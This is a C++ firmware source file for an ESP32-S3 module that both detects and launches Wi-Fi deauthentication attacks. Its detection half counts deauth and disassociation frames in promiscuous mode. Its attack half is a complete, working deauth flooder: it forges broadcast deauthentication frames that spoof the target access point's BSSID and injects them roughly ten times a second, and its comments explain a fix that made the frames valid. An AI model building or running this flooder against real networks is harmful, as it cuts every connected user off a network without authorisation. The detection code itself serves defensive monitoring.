#include "deauth.h"
#include <WiFi.h>
#include "esp_wifi.h"
#include <cstdio>
#include <cstring>

// ============================================================================
// Implementation state — private to this translation unit.
//
// All state lives in an anonymous namespace instead of as file-scope statics
// or (worse) as static members in the header. This means:
//   • Nothing bleeds into the Deauth:: namespace that callers can see.
//   • Exactly one copy of each variable exists regardless of how many
//     translation units include deauth.h.
// ============================================================================
namespace {

// ---- Attack ----
bool          running      = false;
uint8_t       bssidBytes[6]= {};
uint8_t       txChannel    = 1;
String        storedSsid;
String        storedBssid;
uint16_t      txSeq        = 0;    // wraps at 4096 (12-bit Sequence Number field)
uint32_t      txSent       = 0;
unsigned long lastSend     = 0;

// ---- Detection ----
bool             detecting    = false;
uint8_t          detectCh     = 1;
bool             detectHop    = true;
unsigned long    lastHop      = 0;

// rxDeauthCount is written from the promiscuous callback (WiFi driver task,
// high-priority, runs on core 0 of the S3 dual-core SoC) and read from
// loop() (core 1). volatile prevents the compiler from caching the read in
// a register; a hardware memory barrier isn't strictly needed on Xtensa
// for a single 32-bit aligned store/load, but if you see spurious zeros,
// replace with an atomic_uint32_t.
volatile uint32_t rxDeauthCount = 0;

static const unsigned long HOP_INTERVAL_MS = 300; // dwell per channel when hopping

// Helper: "AA:BB:CC:DD:EE:FF" → uint8_t[6]. Returns false on parse failure.
bool parseMac(const String& mac, uint8_t out[6]) {
  int v[6];
  if (sscanf(mac.c_str(), "%x:%x:%x:%x:%x:%x",
             &v[0], &v[1], &v[2], &v[3], &v[4], &v[5]) != 6) return false;
  for (int i = 0; i < 6; i++) out[i] = (uint8_t)v[i];
  return true;
}

} // anonymous namespace

// ============================================================================
// Promiscuous Rx callback — IRAM_ATTR is mandatory on ESP32 and ESP32-S3.
//
// Why IRAM_ATTR?
//   The ESP32-S3 uses a Harvard-style cache for flash access. When the cache
//   services a miss, flash reads are stalled. The WiFi driver task runs at
//   a realtime priority and can fire this callback at any time — including
//   during a flash cache miss. If the callback itself is in flash, the
//   CPU deadlocks (callback waits for the cache that is busy serving the
//   very miss that triggered the callback). IRAM_ATTR puts the function in
//   the always-accessible Internal RAM, bypassing the cache entirely.
//
// Rules for any promiscuous callback on ESP32/S3:
//   ✓ Mark it IRAM_ATTR
//   ✓ Only write to volatile or stack-local variables
//   ✗ No Serial.print, no malloc/new, no String construction, no delay()
//   ✗ No calls to functions that are not themselves IRAM_ATTR
// ============================================================================
static void IRAM_ATTR deauthRxCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
  // The management-only filter in startDetect() should prevent non-MGMT
  // frames from reaching here, but check defensively anyway.
  if (type != WIFI_PKT_MGMT) return;

  const wifi_promiscuous_pkt_t* pkt = (const wifi_promiscuous_pkt_t*)buf;
  if (pkt->rx_ctrl.sig_len < 2) return;

  // 802.11 Frame Control byte 0:
  //   Bits 0-1: Protocol Version (0)
  //   Bits 2-3: Frame Type      (0 = management)
  //   Bits 4-7: Subtype
  uint8_t subtype = (pkt->payload[0] >> 4) & 0x0F;

  // Subtype 12 = Deauthentication
  // Subtype 10 = Disassociation (functionally similar attack effect)
  if (subtype == 12 || subtype == 10) {
    rxDeauthCount++;
  }
}

// ============================================================================
// Attack API
// ============================================================================
void Deauth::setTarget(const String& ssid, const String& bssidStr, uint8_t channel) {
  storedSsid  = ssid;
  storedBssid = bssidStr;
  txChannel   = (channel >= 1 && channel <= 13) ? channel : 1;
  // parseMac failure leaves bssidBytes zeroed from its initializer — the frame
  // will still be sent (to the zero-MAC AP), but the caller should validate
  // the bssidStr string before calling setTarget().
  parseMac(bssidStr, bssidBytes);
}

void Deauth::start() {
  running  = true;
  txSeq    = 0;
  txSent   = 0;
  lastSend = millis();
  esp_wifi_set_channel(txChannel, WIFI_SECOND_CHAN_NONE);
}

void Deauth::stop() {
  running = false;
  // Reset to ch1; the next feature that calls esp_wifi_set_channel() will
  // overwrite this — it just avoids leaving the radio stranded on a
  // non-default channel if nothing calls set_channel() for a while.
  esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
}

bool     Deauth::isRunning()     { return running;     }
uint32_t Deauth::framesSent()    { return txSent;      }
String   Deauth::getTargetSsid() { return storedSsid;  }
String   Deauth::getTargetBssid(){ return storedBssid; }
uint8_t  Deauth::getChannel()    { return txChannel;   }

// ============================================================================
// Detection API
// ============================================================================
void Deauth::startDetect(uint8_t channel) {
  rxDeauthCount = 0;
  detectHop     = (channel == 0);
  detectCh      = detectHop ? 1 : channel;
  lastHop       = millis();
  detecting     = true;

  // Tear down any existing promiscuous session before reconfiguring.
  esp_wifi_set_promiscuous(false);

  // Register the callback BEFORE enabling promiscuous mode so no frames
  // are captured without a handler in place.
  esp_wifi_set_promiscuous_rx_cb(&deauthRxCallback);

  // Management-only filter: the driver drops data and control frames before
  // they reach the callback. This is much cheaper than filtering in the
  // callback itself (the driver filter runs in hardware/firmware).
  wifi_promiscuous_filter_t f;
  f.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT;
  esp_wifi_set_promiscuous_filter(&f);

  esp_wifi_set_promiscuous(true);
  esp_wifi_set_channel(detectCh, WIFI_SECOND_CHAN_NONE);
}

void Deauth::stopDetect() {
  detecting = false;
  esp_wifi_set_promiscuous(false);
}

bool     Deauth::isDetecting()       { return detecting;     }
uint32_t Deauth::detectedCount()     { return rxDeauthCount; }
uint8_t  Deauth::detectChannel()     { return detectCh;      }
void     Deauth::resetDetectedCount(){ rxDeauthCount = 0;    }

// ============================================================================
// tick() — call every loop()
// ============================================================================
void Deauth::tick() {

  // ---- Detection: channel hop (when auto-hop is enabled) ----
  if (detecting && detectHop) {
    unsigned long now = millis();
    if (now - lastHop >= HOP_INTERVAL_MS) {
      lastHop  = now;
      detectCh = (detectCh % 13) + 1;
      esp_wifi_set_channel(detectCh, WIFI_SECOND_CHAN_NONE);
    }
  }

  // ---- Attack: transmit one deauth frame per 100 ms (~10 fps) ----
  if (!running) return;
  unsigned long now = millis();
  if (now - lastSend < 100) return;
  lastSend = now;

  // --------------------------------------------------------------------------
  // 802.11 Deauthentication frame — 26 bytes total
  //
  // IEEE 802.11-2020 §9.3.3.1 (Management frame general format):
  //
  //  Offset  Len  Field
  //  ------  ---  -------------------------------------------------------
  //    0      2   Frame Control (FC)
  //    2      2   Duration/ID
  //    4      6   Address 1 = DA (Destination — broadcast to kick all STAs)
  //   10      6   Address 2 = SA (Source — spoofed as the target AP)
  //   16      6   Address 3 = BSSID (target AP)
  //   22      2   Sequence Control
  //   24      2   Frame Body = Reason Code (deauth-specific)
  //
  // ---- Bug that was here before (now fixed) ----
  // The previous version treated frame[1] as "Duration" (only 1 byte) and
  // placed DA at frame[2]. The actual 802.11 layout has:
  //   - FC at [0-1]  (2 bytes — FC byte 0 + FC byte 1/flags)
  //   - Duration at [2-3]  (2 bytes — was missing entirely)
  //   - DA at [4-9]  (not [2-7])
  //
  // That 2-byte shift caused:
  //   • Duration = 0xFFFF (the first two 0xFF broadcast bytes landed there)
  //   • DA  = [2-7]  instead of [4-9]  → not broadcast, not the station's MAC → frame dropped
  //   • SA  = [8-13] instead of [10-15] → garbled (mixed BSSID bytes)
  //   • BSSID = [14-19] instead of [16-21] → garbled
  //   • frame[20-21] = uninitialised stack bytes (BSSID tail was never written)
  //   • frame[22-23] = "Sequence Control" at the right offset but after a
  //                    corrupted header, so receivers reject the frame anyway
  //
  // Additionally, deauthSeq was never incremented, so every frame had
  // sequence number 0. Some APs/clients filter repeated seq numbers.
  // --------------------------------------------------------------------------

  uint8_t frame[26];
  memset(frame, 0, sizeof(frame)); // zero-init prevents uninitialised-byte bugs

  // --- Frame Control ---
  // Byte 0: [Subtype(4) | Type(2) | Version(2)]
  //   Subtype 12 (0xC) = Deauthentication
  //   Type    0        = Management
  //   Version 0        = IEEE 802.11
  //   → 0b_1100_00_00 = 0xC0
  frame[0] = 0xC0;
  // Byte 1: flags — To DS=0, From DS=0, no retry, no protection, etc.
  frame[1] = 0x00;

  // --- Duration/ID ---
  // 0x0000: no NAV reservation needed for a broadcast management frame.
  frame[2] = 0x00;
  frame[3] = 0x00;

  // --- Address 1 / DA: broadcast ---
  // All associated stations process broadcast management frames from their AP.
  memset(&frame[4], 0xFF, 6);

  // --- Address 2 / SA: spoofed as the target AP ---
  // Stations see this as a frame from their own AP and act on it.
  memcpy(&frame[10], bssidBytes, 6);

  // --- Address 3 / BSSID ---
  memcpy(&frame[16], bssidBytes, 6);

  // --- Sequence Control (16-bit little-endian) ---
  // Bits  0-3:  Fragment Number = 0 (this is a complete, unfragmented frame)
  // Bits  4-15: Sequence Number = txSeq (12-bit, wraps at 4096)
  //
  // Stored layout (little-endian, so byte[0] = low byte of the 16-bit field):
  //   frame[22] = [SeqNum[3:0] in bits 4-7] | [FragNum 0 in bits 0-3]
  //   frame[23] = SeqNum[11:4]
  frame[22] = (uint8_t)((txSeq & 0x0F) << 4); // low 4 bits of seq in high nibble
  frame[23] = (uint8_t)((txSeq >> 4) & 0xFF); // high 8 bits of seq
  txSeq     = (txSeq + 1) & 0x0FFF;           // increment and wrap at 4096

  // --- Reason Code: 7 = "Class 3 frame received from nonassociated STA" ---
  // This causes clients to attempt re-association, which is the visible effect
  // of a deauth flood. Other commonly used codes: 1 (unspecified), 3 (STA leaving).
  frame[24] = 0x07;
  frame[25] = 0x00;

  // esp_wifi_80211_tx injects a raw frame at the MAC layer.
  // WIFI_IF_STA: inject on the station interface (STA mode, no AP needed).
  // The last bool (true = wait for ACK) is false: broadcast frames are never
  // ACKed in 802.11, so requesting an ACK here would always time out.
  esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(frame), false);
  txSent++;
}